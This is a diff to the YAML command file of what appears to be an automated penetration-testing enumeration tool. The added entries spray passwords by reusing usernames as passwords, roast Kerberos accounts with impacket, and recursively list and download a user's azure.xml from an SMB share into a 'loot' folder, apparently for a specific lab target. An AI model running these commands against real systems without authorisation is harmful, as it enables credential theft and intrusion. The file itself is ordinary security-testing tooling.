@@ -172,7 +172,8 @@ commands:
   ldap:
     "nmapLdap": "nmap -vv -Pn -sV -p $ldapPorts --script ldap* -oA $nmapReportDir/ldap-$target $target"
     "enum4linuxLdap": "enum4linux -a -M -l -d $target | tee $reportDir/ldap/ldapEnum4linux.log"
-    "GetNPUsers": "/opt/impacket/examples/GetNPUsers.py $domain/ -dc-ip $target -usersfile $reportDir/wordlists/ldapUsernames.txt | tee $reportDir/ldap/getNPUserNamesBrute.log"
+    "GetNPUsers": "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/ -dc-ip $target -usersfile $reportDir/wordlists/ldapUsernames.txt | tee $reportDir/ldap/getNPUserNamesBrute.log"
+    "authCheck": "perl $pwd/scripts/acc_check.pl -t $target -U $reportDir/wordlists/ldapUsernames.txt -P $reportDir/wordlists/ldapUsernames.txt -v | tee $reportDir/loot/smb_auth_check.log"
   oracle:
     "nmapOracle": "nmap -sV -p 1521 --script oracle-enum-users.nse,oracle-sid-brute.nse,oracle-tns-version.nse -oA $nmapReportDir/oracle $target"
     "tnscmd10g": "tnscmd10g $mode -h $target -p 1521 | tee $reportDir/oracle/oracle-$mode.log"
@@ -190,6 +191,8 @@ commands:
     "smbmapNull": "smbmap -u null -p '' -H $target | tee -a $reportDir/smb/smb-scan-$target.log"
     "smbmapNullR": "smbmap -u null -p '' -H $target -R | tee -a $reportDir/smb/smb-scan-$target.log"
     "enum4linux": "enum4linux -av $target | tee -a $reportDir/smb/enum4linux-$target.log"
+    "authSmb": "smbmap -H $target -u '$validPass' -p '$validPass' -R | tee $reportDir/loot/authorized_smbmap.log"
+    "azure": "smbmap -H $target -u '$validPass' -p '$validPass' -R 'users$$\\mhope' --download 'users$$\\mhope\\azure.xml' -q"
   smtp:
     "smtpUserEnum": "smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $target -p $p 2>&1 | tee $reportDir/smtp/smtp-user-enum-$p.log"
   finger:
@@ -381,6 +384,7 @@ paths:
     "nmapSmb": "$nmapReportDir/smbvulns-$target"
     "smbDir": "$reportDir/smb"
     "smbScan": "$reportDir/smb/smb-scan-$target.log"
+    "smbAuthCheck": "$reportDir/loot/smb_auth_check.log"
   ssh:
     "sshDir": "$reportDir/ssh"
     "ssh_user_enum": "$pwd/scripts/ssh_user_enum.py"
@@ -399,6 +403,8 @@ paths:
     "lootDir": "$reportDir/loot"
     "krbHashes": "$reportDir/loot/krbHashes.txt"
     "creds": "$reportDir/loot/credentials.log"
+    "authSmbmap": "$reportDir/loot/authorized_smbmap.log"
+    "azure": "$reportDir/loot/azure.xml"
   oracle:
     "oracleDir": "$reportDir/oracle"
     "oraclelog": "$reportDir/oracle/oracle.log"
